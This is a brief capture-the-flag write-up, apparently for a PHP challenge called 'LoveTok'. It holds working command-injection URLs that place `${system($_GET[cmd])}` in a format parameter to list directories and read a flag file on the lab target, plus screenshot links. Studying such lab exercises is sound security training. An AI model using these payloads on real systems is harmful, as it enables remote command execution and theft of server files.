# LoveTok

## Code Audit

- find url `http://159.65.20.166:31685/?format=r` with info exhibition

![image-20240119140745106](./LoveTok.assets/image-20240119140745106.png)

![image-20240119140749067](./LoveTok.assets/image-20240119140749067.png)

![image-20240119140752469](./LoveTok.assets/image-20240119140752469.png)

## Command Injection

- `http://159.65.20.166:31685/?format=${system($_GET[cmd])}&cmd=ls`

![image-20240119140808093](./LoveTok.assets/image-20240119140808093.png)

- `http://159.65.20.166:31685/?format=${system($_GET[cmd])}&cmd=ls ../`

![image-20240119140827814](./LoveTok.assets/image-20240119140827814.png)

- `http://159.65.20.166:31685/?format=${system($_GET[cmd])}&cmd=cat ../flag8AiQ0`